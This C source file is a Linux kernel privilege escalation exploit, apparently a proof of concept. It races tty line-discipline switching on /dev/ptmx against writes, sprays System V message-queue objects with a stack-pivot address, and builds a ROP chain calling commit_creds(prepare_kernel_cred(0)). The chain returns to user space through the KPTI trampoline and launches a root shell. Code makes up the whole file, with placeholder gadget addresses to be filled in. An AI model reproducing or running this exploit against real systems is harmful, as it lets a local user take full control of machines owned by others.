#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <sys/ioctl.h>
#include <sys/msg.h>
#include <sys/mman.h>
#include <sched.h>

// --- GADGETS (From your analysis) ---
#define PIVOT_XCHG_ESP_EAX 0xffffffff8215935c // xchg esp, eax; ret
#define POP_RDI_RET        0xffffffff81001850 // Search for this in gadgets.txt
#define MOV_RDI_RAX_RET    0xffffffff81023d53 // Search for this in gadgets.txt
#define COMMIT_CREDS       0xffffffff810c9c10 // Replace with your 'p commit_creds'
#define PREPARE_CREDS      0xffffffff810c9f10 // Replace with your 'p prepare_kernel_cred'
#define KPTI_TRAMPOLINE    0xffffffff822010a0 // Entry point for swapgs_restore_regs_and_return_to_usermode

// --- LANDING ZONE ---
#define FAKE_STACK_ADDR    0x42424242
#define PAYLOAD_VAL        PIVOT_XCHG_ESP_EAX

struct alice_msg {
    long mtype;
    uint64_t data[14];
};

void pin_to_cpu(int cpu) {
    cpu_set_t mask;
    CPU_ZERO(&mask);
    CPU_SET(cpu, &mask);
    sched_setaffinity(0, sizeof(mask), &mask);
}

// This function runs once we are back in Userland as ROOT
void win() {
    if (getuid() == 0) {
        printf("[+] ALICE HAS THE KEY! Launching Root Shell...\n");
        system("/bin/sh");
    } else {
        printf("[-] Failed to get root. RIP.\n");
    }
    exit(0);
}

// Build the Fake Stack in Userland
void prepare_fake_stack() {
    void *addr = mmap((void*)0x42424000, 0x4000, PROT_READ|PROT_WRITE, 
                      MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, -1, 0);
    
    uint64_t *stack = (uint64_t *)FAKE_STACK_ADDR;
    int i = 0;

    // ROP Chain: commit_creds(prepare_kernel_cred(0))
    stack[i++] = POP_RDI_RET;
    stack[i++] = 0;                // Argument 0 for prepare_kernel_cred
    stack[i++] = PREPARE_CREDS;
    stack[i++] = MOV_RDI_RAX_RET;  // Move result from RAX to RDI
    stack[i++] = COMMIT_CREDS;
    
    // Return to Userland via KPTI Trampoline
    stack[i++] = KPTI_TRAMPOLINE;
    stack[i++] = 0;                // RAX
    stack[i++] = 0;                // RDI
    stack[i++] = (uint64_t)win;    // Our userland function
    stack[i++] = 0x33;             // CS
    stack[i++] = 0x246;            // EFLAGS
    stack[i++] = FAKE_STACK_ADDR + 0x1000; // ESP
    stack[i++] = 0x2b;             // SS
}

void spray() {
    struct alice_msg msg;
    msg.mtype = 1;
    for (int i = 0; i < 14; i++) msg.data[i] = PAYLOAD_VAL;

    for (int i = 0; i < 128; i++) {
        int msgid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
        msgsnd(msgid, &msg, sizeof(msg.data), IPC_NOWAIT);
    }
}

int main() {
    printf("[*] Alice Poc_Extraordinaire: Starting Final Race...\n");
    prepare_fake_stack();

    int fd = open("/dev/ptmx", O_RDWR | O_NOCTTY);
    int ldisc_n_slip = 2;
    int ldisc_n_tty = 0;

    if (fork() == 0) {
        pin_to_cpu(1);
        while(1) {
            char buf[512] = {0};
            write(fd, buf, 512);
        }
    }

    pin_to_cpu(0);
    while(1) {
        ioctl(fd, 0x5423, &ldisc_n_slip);
        spray(); // Poison the hole with our Stack Pivot address
        ioctl(fd, 0x5423, &ldisc_n_tty);
    }

    return 0;
}
